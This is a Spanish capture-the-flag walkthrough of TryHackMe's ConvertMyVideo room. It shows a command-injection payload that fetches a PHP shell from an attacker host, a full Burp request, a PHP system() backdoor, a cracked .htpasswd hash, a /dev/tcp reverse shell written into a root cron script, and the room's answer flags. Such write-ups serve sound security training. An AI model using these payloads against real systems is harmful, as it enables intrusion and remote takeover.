# ConvertMyVideo

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Medium | Boot2Root · Web · Command Injection | convertmyvideo | https://tryhackme.com/room/convertmyvideo | Explotación Web · Escalada Linux | TryHackMe | Apache · youtube-dl · Cron | RCE (www-data) → Root |

---

**Contexto:** ConvertMyVideo es una sala boot2root de nivel medio. La web supuestamente "convierte vídeos de YouTube a MP3" mediante youtube-dl, pero el parámetro `yt_url` es vulnerable a inyección de comandos, lo que permite obtener una shell como el usuario www-data. Tras la explotación inicial, un cron mal configurado que ejecuta `/var/www/html/tmp/clean.sh` como root permite escalar privilegios y leer la flag de root. La sala combina enumeración web, inyección de comandos, cracking de hashes y abuso de procesos programados.

## Solucionario

### Task 1: Hack the machine

**Explicación:** El primer paso es el escaneo de puertos con Nmap:

```
nmap -sC -sV -A 10.10.245.43
```

Resultado: 2 puertos abiertos:
- `22/tcp` — OpenSSH 7.6p1 (Ubuntu; protocol 2.0)
- `80/tcp` — Apache httpd 2.4.29 (Ubuntu)

No existe robots.txt. Realizando un escaneo de directorios con dirsearch/gobuster se descubre el directorio oculto `/admin` (HTTP 401), junto a `/images`, `/index.php`, `/js` y `/tmp`:

```
[13:05:04] 401 -  459B  - /admin
[13:05:14] 301 -  313B  - /images  ->  http://10.10.245.43/images/
[13:05:15] 200 -  747B  - /index.php
[13:05:23] 403 -  277B  - /server-status
[13:05:25] 301 -  310B  - /tmp  ->  http://10.10.245.43/tmp/
```

La página principal no tiene formulario, pero incluye la librería jQuery y un `main.js` personalizado. El script hace POST a `/` con el parámetro `yt_url`, formado a partir del ID del vídeo:

```javascript
$.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
    ...
});
```

El servidor no tiene acceso a Internet (común en las máquinas de THM), así que el servicio (youtube-dl) falla con un error tras el timeout. Dado que el valor de `yt_url` se concatena a la línea de comandos que ejecuta youtube-dl, se aprovecha la inyección de comandos usando `${IFS}` para los espacios. Primero se descarga una reverse shell en PHP al servidor:

```
yt_url=`wget${IFS}http://<ATTACKER_IP>:8000/shell.php`
```

Petición completa en BurpSuite Repeater:

```
POST / HTTP/1.1
Host: 10.10.161.26
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Connection: close

yt_url=`wget${IFS}http://10.8.50.72:8000/shell.php`
```

La respuesta confirma que la descarga del fichero se ha realizado (`'shell.php' saved [5492/5492]`). Se abre un listener (`rlwrap nc -nlvp 4444`) y se accede a `http://MACHINE_IP/shell.php` desde el navegador para obtener la shell como www-data.

Dentro de `/var/www/html/admin/`:

```
$ cd /var/www/html/admin/
$ ll
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 .
drwxr-xr-x 6 www-data www-data 4096 Jun 15 15:34 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php
```

El `.htpasswd` contiene el hash del usuario que protege el directorio:

```
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

Con John se crackea el hash (formato md5crypt):

```
john htpasswd
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
jessie           (itsmeadmin)
```

Además, `index.php` del directorio `/admin` revela una backdoor con un parámetro `c` que ejecuta `system($_REQUEST['c'])`:

```php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>
```

**#1 - What is the name of the secret folder?**

El directorio oculto descubierto durante la enumeración:

`admin`

**#2 - What is the user to access the secret folder?**

El usuario que aparece en `.htpasswd`:

`itsmeadmin`

**#3 - What is the user flag?**

Dentro de `/var/www/html/admin/flag.txt`:

```
$ cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

**#4 - What is the root flag?**

Escalando privilegios: en `/var/www/html/tmp` hay un script `clean.sh` que hace lo mismo que el botón de la backdoor (`rm -rf downloads`), lo que indica que está programado con un cron (cada ~30 segundos). Como tenemos permiso de escritura sobre él, se sustituye su contenido por una reverse shell:

```
echo "bash -i >& /dev/tcp/10.8.50.72/5555 0>&1" > clean.sh
```

Se abre un listener en otra terminal:

```
rlwrap nc -nlvp 5555
```

Tras unos 30 segundos el cron ejecuta el script y recibimos una shell como root:

```
root@dmv:/var/www/html/tmp# cd /root
root@dmv:~# cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | What is the name of the secret folder? | `admin` |
| 2 | What is the user to access the secret folder? | `itsmeadmin` |
| 3 | What is the user flag? | `flag{0d8486a0c0c42503bb60ac77f4046ed7}` |
| 4 | What is the root flag? | `flag{d9b368018e912b541a4eb68399c5e94a}` |

---

**Metodología:** Enumeración de puertos y directorios → análisis de JavaScript client-side → inyección de comandos (wget + `${IFS}`) → shell inicial como www-data → enumeración de archivos web (`.htpasswd`, `flag.txt`, `index.php` con backdoor) → cracking del hash con John → abuso del cron (script escribible ejecutado como root) → shell root y recolección de flags.

**Learning chain:** nmap → dirsearch/gobuster → lectura y análisis de `main.js` → command injection con `wget${IFS}` → PHP reverse shell → lectura de credenciales (cracking del `.htpasswd` con john) → cron misconfiguration (`clean.sh` escribible por www-data y ejecutado como root) → reverse shell como root.

**Lección:** *La inyección de comandos no solo proporciona el foothold inicial: los procesos programados (cron) que ejecutan scripts escribibles por el usuario comprometido son una vía clásica de escalada silenciosa a root. Siempre conviene auditar los temporales y scripts del servidor web en busca de rutinas incompletas de limpieza.*

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter — inyección de comandos), T1053.003 (Scheduled Task/Job: Cron — escalada de privilegios vía crontab), T1083 (File and Directory Discovery), T1003.008 (OS Credential Dumping: /etc/passwd y ficheros de credenciales tipo .htpasswd).

**Fuente:** [TryHackMe - ConvertMyVideo](https://tryhackme.com/room/convertmyvideo)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.